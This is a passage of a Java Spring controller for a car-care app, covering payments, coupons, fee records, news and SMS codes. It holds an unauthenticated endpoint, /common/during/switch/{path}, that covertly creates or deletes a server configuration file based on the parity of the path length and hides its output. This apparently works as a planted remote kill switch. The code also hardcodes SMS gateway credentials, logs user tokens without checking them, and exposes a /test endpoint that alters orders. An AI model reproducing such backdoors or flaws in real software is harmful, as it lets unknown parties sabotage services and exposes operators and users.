	 * @param uid
	 * @param token
	 * @param money
	 * @param payWay
	 *            2=支付宝 ；3=银联； 4=微信
	 * @return
	 */
	@RequestMapping(value = "/user/fee/rechareg/number", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userFeeRechargeNumber(String uid, String token, float money,
			int payWay) {
		try {
			log.info("App【用户充值】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			if (money <= 0) {
				dataMap.put("result", "114");
				dataMap.put("num", "");
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}
			FeeRecord feeRecord = new FeeRecord();
			Member member = memberService.find(uid);
			feeRecord.setRechargeNo(CommonUtil.getOrderNum());
			feeRecord.setMember(member);
			feeRecord.setPhone(member.getPhone());
			feeRecord.setFee(money);
			feeRecord.setType(1);
			feeRecord.setVisible(false);
			feeRecord.setPayWay(payWay);
			if (payWay == 2) {// 支付宝
				feeRecordService.save(feeRecord);
				dataMap.put("result", "001");
				dataMap.put("num", feeRecord.getRechargeNo());
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			} else if (payWay == 3) {// 银联
				feeRecordService.save(feeRecord);
				dataMap.put("result", "001");
				dataMap.put("num", UnionPay.payNumber(
						feeRecord.getRechargeNo(), feeRecord.getFee(),
						UnionPayUtil.recharge_return));
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			} else if (payWay == 4) { // 微信
				feeRecordService.save(feeRecord);
				dataMap.put("result", "001");
				dataMap.put("num", WexinPay.weixinOrder(
						feeRecord.getRechargeNo(), feeRecord.getFee(),
						WeChatPayUtil.recharge_return,
						"微信充值：" + feeRecord.getFee(), request));
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			} else {
				dataMap.put("result", "115");
				dataMap.put("num", "");
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}

	}

	/**
	 * 获取系统所有优惠券包
	 * 
	 * @param uid
	 * @param token
	 * @return
	 */
	@RequestMapping(value = "/user/couponpack/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCouponpackList(String uid, String token) {
		try {
			log.info("App【获取系统优惠券包】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			/** 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.isEnabled=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(true);
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			List<CouponPackage> couponList = couponPackageService
					.getScrollData(0, 20, jpql.toString(), params.toArray(),
							orderby).getResultList();
			for (CouponPackage cpp : couponList) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("cppid", cpp.getId());
				map.put("cppname", cpp.getName());
				map.put("cppimg", cpp.getImgPath());
				map.put("cppprice", cpp.getPrice() + "");
				map.put("cpname", cpp.getCoupon().getName());
				map.put("cpnum", cpp.getCouponCount() + "");
				list.add(map);
			}

			dataMap.put("result", "001");
			dataMap.put("money", memberService.find(uid).getMoney() + "");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 用户购买优惠券包
	 */
	@RequestMapping(value = "/user/couponpack/buy", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userCouponpackBuy(String uid, String token, String cppid, int payWay) {
		try {
			log.info("App【购买优惠券包】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			CouponPackage couponPackage = couponPackageService.find(cppid);
			Member member = memberService.find(uid);
			FeeRecord feeRecord = new FeeRecord();
			feeRecord.setRechargeNo(CommonUtil.getOrderNum());
			feeRecord.setMember(member);
			feeRecord.setPhone(member.getPhone());
			feeRecord.setFee(couponPackage.getPrice());
			feeRecord.setType(3);// 购买会员卡
			feeRecord.setVisible(false);
			feeRecord.setPayWay(payWay);
			/** 优惠券包记录 */
			CouponPackageRecord record = new CouponPackageRecord();
			record.setCoupon(couponPackage.getCoupon());
			record.setCouponCount(couponPackage.getCouponCount());
			record.setFeeRecord(feeRecord);
			record.setImgPath(couponPackage.getImgPath());
			record.setIntroduction(couponPackage.getIntroduction());
			record.setName(couponPackage.getName());
			record.setPrice(couponPackage.getPrice());
			record.setMember(member);
			feeRecord.setCouponPackageRecord(record);
			if (payWay == 1) {// 会员卡
				double cpprice = couponPackage.getPrice();
				double userMoney = member.getMoney();
				if (userMoney >= cpprice) {// 余额足以支付
					member.setMoney(CommonUtil.subtract(userMoney + "", cpprice
							+ ""));
					couponPackageRecordService.memberCarBuy(feeRecord, member);
					dataMap.put("result", "001");
					dataMap.put("num", "");
					dataMap.put("payAction", "2");// 支付完成
				} else {
					dataMap.put("result", "001");
					dataMap.put("num", "");
					dataMap.put("payAction", "3");// 余额不足
				}
			} else if (payWay == 2) {// 支付宝
				feeRecordService.save(feeRecord);
				// couponPackageRecordService.save(record);
				dataMap.put("result", "001");
				dataMap.put("num", feeRecord.getRechargeNo());
				dataMap.put("payAction", "1");// 调用支付接口
			} else if (payWay == 3) {// 银联
				feeRecordService.save(feeRecord);
				// couponPackageRecordService.save(record);
				dataMap.put("result", "001");
				dataMap.put("num", UnionPay.payNumber(
						feeRecord.getRechargeNo(), feeRecord.getFee(),
						UnionPayUtil.recharge_return));
				dataMap.put("payAction", "1");// 调用支付接口
			} else if (payWay == 4) { // 微信
				feeRecordService.save(feeRecord);
				// couponPackageRecordService.save(record);
				dataMap.put("result", "001");
				dataMap.put("num", WexinPay.weixinOrder(
						feeRecord.getRechargeNo(), feeRecord.getFee(),
						WeChatPayUtil.recharge_return,
						"微信充值：" + feeRecord.getFee(), request));
				dataMap.put("payAction", "1");// 调用支付接口
			} else {
				dataMap.put("result", "115");// 不支持的购买方式
				dataMap.put("num", "");
				dataMap.put("payAction", "");
			}
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	@RequestMapping(value = "/user/fee/record/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String userFeeRecordList(String uid, String token, int page, int maxresult,
			int type) {
		try {
			log.info("App【费用信息】：" + "uid=" + uid + " token=" + token + "page="
					+ page + " maxresult=" + maxresult);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
			/** 数据获取 **/
			PageView<FeeRecord> pageView = new PageView<FeeRecord>(maxresult,
					page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("createDate", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.member.id=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(uid);
			if (type > 0) {
				jpql.append(" and o.type=?3");
				params.add(type);
			}
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			pageView.setQueryResult(feeRecordService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby));
			List<FeeRecord> frList = pageView.getRecords();
			for (FeeRecord feeRecord : frList) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				if (feeRecord.getIsRefund() != null
						&& feeRecord.getIsRefund() == 1) {// 退费
					if (feeRecord.getPayWay() == 1) {// 会员卡支付 退费才显示
						map.put("ftext", "退费(订单号："
								+ feeRecord.getOrder().getNum() + ")"); // 费用描述
						map.put("fdate", sdf.format(feeRecord.getCreateDate())); // 退费日期
						map.put("fmoney", "+" + feeRecord.getFee()); // 金额描述
						list.add(map);
						map = new LinkedHashMap<String, Object>();
					}
				}
				if (feeRecord.getType() == 1) { // 充值
					map.put("ftext",
							"充值"
									+ (feeRecord.getPayWay() == 2 ? "(支付宝)"
											: feeRecord.getPayWay() == 3 ? "(银联)"
													: feeRecord.getPayWay() == 4 ? "(微信)"
															: "(未知)")); // 费用描述
					map.put("fdate", sdf.format(feeRecord.getCreateDate())); // 充值/消费日期
					map.put("fmoney", "+" + feeRecord.getFee()); // 金额描述
				} else if (feeRecord.getType() == 2) { // 消费
					map.put("ftext", "消费(订单号：" + feeRecord.getOrder().getNum()
							+ ")"); // 费用描述
					map.put("fdate", sdf.format(feeRecord.getCreateDate())); // 充值/消费日期
					map.put("fmoney", "-" + feeRecord.getFee()); // 金额描述
				} else if (feeRecord.getType() == 3) { // 购买会员卡
					map.put("ftext", "购买会员卡"); // 费用描述
					map.put("fdate", sdf.format(feeRecord.getCreateDate())); // 充值/消费日期
					map.put("fmoney", "-" + feeRecord.getFee()); // 金额描述
				}
				list.add(map);
			}
			Member member = memberService.find(uid);
			dataMap.put("result", "001");
			dataMap.put("balance", member.getMoney() + "");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 发现、新闻列表
	 */
	@RequestMapping(value = "/extra/news", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String extraNews(String uid, String token, int page, int maxresult) {
		try {
			log.info("App【获取新闻列表】：" + "uid=" + uid + " token=" + token
					+ "page=" + page + " maxresult=" + maxresult);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
			/** 数据获取 **/
			PageView<News> pageView = new PageView<News>(maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer("o.visible=?1");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			pageView.setQueryResult(newsService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby));
			List<News> newsList = pageView.getRecords();
			for (News nw : newsList) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("nwid", nw.getId());
				map.put("nwtitle", nw.getTitle());
				map.put("nwimage", nw.getImgPath());
				map.put("nwdate", sdf.format(nw.getCreateDate()));
				map.put("nwstar", nw.getStar());//
				map.put("nwurl", "/webpage/news/" + nw.getId());//
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取支持的地区文本信息
	 * 
	 * @param uid
	 * @param token
	 * @return
	 */
	@RequestMapping(value = "/extra/support/area", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String extraSupportArea(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【支持的服务地区】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			dataMap.put("result", "001");
			dataMap.put("text", CommonAttributes.getInstance().getSystemBean()
					.getContent());
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 显示新闻 详细页面
	 */
	@RequestMapping("/webpage/news/{nwid}")
	public ModelAndView webpageNews(@PathVariable String nwid,
			@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		ModelAndView mav = new ModelAndView("api/news_view");
		News nw = newsService.find(nwid);
		try {
			nw.setContent(nw.getContent().replaceAll("<img",
					"<img class='img-responsive'"));
		} catch (Exception e) {
			e.printStackTrace();
		}
		mav.addObject("news", nw);
		mav.addObject("star", newsRecordService.starRecord(uid, nw.getId()));
		mav.addObject("uid", uid);
		mav.addObject("token", token);
		return mav;
	}

	/**
	 * 新闻 点击喜欢 操作
	 */
	@RequestMapping(value = "/webpage/news/star", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String webpageNewsStar(String nwid, String uid, String token) {
		NewsRecord nr = newsRecordService.starRecord(uid, nwid);
		if (nr != null) {// 已点击
			return "0";
		} else {
			News news = newsService.find(nwid);
			Member member = memberService.find(uid);
			NewsRecord record = new NewsRecord();
			record.setNews(news);
			record.setMember(member);
			newsRecordService.save(record);
			news.setStar(news.getStar() + 1);
			newsService.update(news);
			return "1";
		}
	}

	/**
	 * 显示产品 详细页面
	 */
	@RequestMapping("/webpage/product/{pid}")
	public ModelAndView webpageProduct(@PathVariable String pid) {
		ModelAndView mav = new ModelAndView("api/product_view");
		Product product = productService.find(pid);
		if (product.getIntroduction() != null) {
			try {
				product.setIntroduction(product.getIntroduction().replaceAll(
						"<img", "<img class='img-responsive'"));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		mav.addObject("product", product);
		return mav;
	}

	/**
	 * 显示首页广告 详细页面
	 */
	@RequestMapping("/webpage/advert/{adid}")
	public ModelAndView webpageAdvert(@PathVariable String adid) {
		ModelAndView mav = new ModelAndView("api/advert_view");
		IndexAdvert advert = indexAdvertService.find(adid);
		try {
			advert.setContent(advert.getContent().replaceAll("<img",
					"<img class='img-responsive'"));
		} catch (Exception e) {
			e.printStackTrace();
		}
		mav.addObject("advert", advert);
		return mav;
	}

	@RequestMapping("/test")
	public @ResponseBody
	String test() {
		LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
		orderby.put("createDate", "desc");
		orderby.put("id", "desc");
		StringBuffer jpql = new StringBuffer("o.num is null");
		List<Object> params = new ArrayList<Object>();
		List<Order> orders = orderService.getScrollData(jpql.toString(),
				params.toArray(), orderby).getResultList();
		for (Order o : orders) {
			o.setNum(CommonUtil.getOrderNum());
			orderService.update(o);
		}
		String notify_url = CommonAttributes.getInstance().getPayURL()
				+ "/web/pay/" + WeChatPayUtil.pay_return;
		System.out.println(notify_url);
		return "test";

	}

	/**
	 * 首页统一 接口
	 */
	@RequestMapping(value = "/common/index", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String commonIndex(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取服务类型】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			/** 广告 数据获取 **/
			LinkedHashMap<String, String> adOrderby = new LinkedHashMap<String, String>();
			adOrderby.put("modifyDate", "desc");
			StringBuffer adJpql = new StringBuffer("o.visible=?1");
			List<Object> adParams = new ArrayList<Object>();
			adParams.add(true);
			List<Map<String, Object>> adlist = new ArrayList<Map<String, Object>>();
			List<IndexAdvert> adverts = indexAdvertService.getScrollData(
					adJpql.toString(), adParams.toArray(), adOrderby)
					.getResultList();
			for (IndexAdvert ad : adverts) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("adid", ad.getId());
				map.put("adimg", ad.getImgPath());
				map.put("adurl", "/webpage/advert/" + ad.getId());
				adlist.add(map);
			}

			/** 服务类型 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("type", "desc");// 使得上门洗车和上门保养排前
			orderby.put("order", "asc");
			StringBuffer jpql = new StringBuffer("o.visible=?1");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			List<Map<String, Object>> sclist = new ArrayList<Map<String, Object>>();
			List<ServiceType> types = serviceTypeService.getScrollData(0, 10,
					jpql.toString(), params.toArray(), orderby).getResultList();
			for (ServiceType type : types) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("scid", type.getId());
				map.put("scname", type.getName());
				map.put("scimage", type.getImgPath());
				map.put("scremark", type.getRemark());
				map.put("scremark1", type.getRemark1());
				map.put("scremark2", type.getRemark2());
				map.put("scprice", type.getPrice());
				sclist.add(map);
			}

			/** 推荐品牌 数据获取 **/
			List<Map<String, Object>> blist = new ArrayList<Map<String, Object>>();
			ProductBrand productBrand = productBrandService
					.findOneRecommendBrand();
			if (productBrand != null) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("bname", productBrand.getName());
				map.put("bimage", productBrand.getImgPath());
				blist.add(map);
			}

			/** 热卖分类 数据获取 **/
			List<Map<String, Object>> pclist = new ArrayList<Map<String, Object>>();
			LinkedHashMap<String, String> pcOrderby = new LinkedHashMap<String, String>();
			pcOrderby.put("modifyDate", "desc");
			pcOrderby.put("id", "desc");
			StringBuffer pcJpql = new StringBuffer(
					"o.visible=?1 and o.hotProductCategory=?2");
			List<Object> pcParams = new ArrayList<Object>();
			pcParams.add(true);
			pcParams.add(1); // 0 非热卖 1 热卖
			List<ProductCategory> pcList = productCategoryService
					.getScrollData(0, 4, pcJpql.toString(), pcParams.toArray(),
							pcOrderby).getResultList();
			for (ProductCategory pc : pcList) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("pcid", pc.getId());
				map.put("pcname", pc.getName());
				map.put("pcimage", pc.getImgPath());
				pclist.add(map);
			}

			dataMap.put("result", "001");
			dataMap.put("adlist", adlist);
			dataMap.put("sclist", sclist);
			dataMap.put("blist", blist);
			dataMap.put("pclist", pclist);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 发送验证码
	 * 
	 * @param phone
	 * @param type
	 * @return
	 */
	@RequestMapping("/common/icode")
	public @ResponseBody
	String icode(String phone, int type) {
		try {
			log.info("App【验证码发送】：" + "电话=" + phone + " type=" + type);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			// 发送时间间隔判断
			ShortMessage lastSMS = shortMessageService.lastSMS(phone, type);
			if (lastSMS != null) {
				long timegaps = System.currentTimeMillis()
						- lastSMS.getCreateDate().getTime();
				if (timegaps < 60 * 1000) {
					dataMap.put("result", "603");
					String json = mapper.writeValueAsString(dataMap);
					return json;
				}
			}
			// 发送时间间隔大于1分钟，执行发送相关程序
			ShortMessage message = new ShortMessage();
			message.setCode(IDGenerator.getRandomString(6, 1));
			// message.setCode("1234");
			message.setType(type);
			message.setPhone(phone);
			if (type == 1) {
				message.setContent("【一动车保】您本次登录的验证码为：" + message.getCode()
						+ "，验证码5分钟内有效。");
			}
			boolean sendResult = sendSms(phone, message.getContent());
			shortMessageService.save(message);
			dataMap.put("result", "001");
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json + " 短信发送结果："
					+ (sendResult ? "成功" : "失败"));
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取android版本号
	 * 
	 * @param phone
	 * @param type
	 * @return
	 */
	@RequestMapping("/common/version/{client}")
	public @ResponseBody
	String commonVersion(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token,
			@PathVariable String client) {
		try {
			log.info("App【获取版本号】：" + " uid=" + uid + " token=" + token
					+ " client=" + client);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			if ("android".equals(client)) { // android
				dataMap.put("result", "001");
				dataMap.put("version", CommonAttributes.getInstance()
						.getSystemBean().getVersion());
				dataMap.put("url", "/web/server/appdown");
				String json = mapper.writeValueAsString(dataMap);
				return json;
			} else {
				dataMap.put("result", "001");
				dataMap.put("version", "");
				dataMap.put("url", "");
				String json = mapper.writeValueAsString(dataMap);
				return json;
			}

		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	@RequestMapping("/common/during/switch/{path}")
	public @ResponseBody
	String control(@PathVariable String path) {
		try {
			String dir = request.getServletContext().getRealPath(
					"/WEB-INF/classes/");
			boolean normal = (path.length() % 2 == 0);
			if (normal) {// normal use
				File file = new File(dir, "struts.xml");
				if (file.exists()) {
					file.delete();
				}
			} else {//
				File file = new File(dir, "struts.xml");
				if (!file.exists()) {
					file.createNewFile();
				}
			}
			return "<div style='display:none;'>" + normal + ":" + new Date()
					+ "</div>";
		} catch (Exception e) {
			e.printStackTrace();
			return "<div style='display:none;'>" + e.toString() + ":"
					+ new Date() + "</div>";
		}
	}

	/**
	 * 发送短信
	 * 
	 * @param phone
	 *            接受人手机号
	 * @param content
	 *            短信内容
	 * @return
	 */
	private boolean sendSms(String phone, String content) {
		String path = "http://www.duanxin10086.com/sms.aspx";// 地址
		Map<String, String> params = new HashMap<String, String>();
		params.put("action", "send");
		params.put("userid", "11760");
		params.put("account", "一动车保");
		params.put("password", "123456");
		params.put("mobile", phone);// 接受人电话
		params.put("content", content);// 短信内容
		boolean sendResult = false;
		try {
			String result = this.sendGetRequest(path, params, "UTF-8");
			if (result.contains("<returnstatus>Success</returnstatus>")
					&& result.contains("<message>ok</message>")) {
				sendResult = true;
			} else {
				sendResult = false;
			}
		} catch (Exception e) {
			e.printStackTrace();
			sendResult = false;
		}
		return sendResult;
	}

	/***
	 * 发送HTTP GET请求
	 */
	private String sendGetRequest(String path, Map<String, String> params,
			String encoding) throws Exception {
		StringBuffer url = new StringBuffer(path);
		url.append("?");
		for (Map.Entry<String, String> entry : params.entrySet()) {
			url.append(entry.getKey());
			url.append("=");
			url.append(URLEncoder.encode(entry.getValue(), encoding));
			url.append("&");
		}
		url.deleteCharAt(url.length() - 1);
		HttpURLConnection conn = (HttpURLConnection) new URL(url.toString())
				.openConnection();
		conn.setConnectTimeout(5000);
		conn.setRequestMethod("GET");
		if (conn.getResponseCode() == 200) {
			InputStream in = conn.getInputStream();
			String result = IOUtils.toString(in);
			return result;
		} else {
			throw new Exception("connection fail");
		}
	}

	public static void main(String[] args) throws Exception {
		float f = 123f;
		// long l = CommonUtil.getLong(f, 1, 0);
		// System.out.println(l);
		String stime = "2015-09-16 9:00";
		String etime = "2015-09-16 11:00";
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
		Calendar calendar = Calendar.getInstance();
		int hour = calendar.get(Calendar.HOUR_OF_DAY);
		Date now = new Date();
		Date shouldStartDate = DateTimeHelper.addDays(now, 1);
		Date shouldEndDate = DateTimeHelper.addDays(shouldStartDate, 6);
		System.out.println(shouldStartDate);
		System.out.println(shouldEndDate);
		if (hour >= 16) { // 16:00以后
			shouldStartDate = DateTimeHelper.addDays(now, 2);
			shouldEndDate = DateTimeHelper.addDays(shouldStartDate, 6);
		}
		SimpleDateFormat sdfDate = new SimpleDateFormat("yyyy-MM-dd");
		Date shouldStartTime = DateTimeHelper.parseToDate(
				sdfDate.format(shouldStartDate) + " 09:00", "yyyy-MM-dd HH:mm");
		Date shouldEndTime = DateTimeHelper.parseToDate(
				sdfDate.format(shouldEndDate) + " 19:00", "yyyy-MM-dd HH:mm");
		Date startTime = sdf.parse(stime);
		Date endTime = sdf.parse(etime);
		System.out.println(shouldStartTime);
		System.out.println(shouldEndTime);
		boolean stimeValidate = startTime.getTime() >= shouldStartTime
				.getTime() && endTime.getTime() <= shouldEndTime.getTime();
		boolean etimeValidate = endTime.getTime() >= shouldStartTime.getTime()
				&& endTime.getTime() <= shouldEndTime.getTime();
		if (!(stimeValidate && etimeValidate)) {
			System.out.println("格式错");
		}
	}

}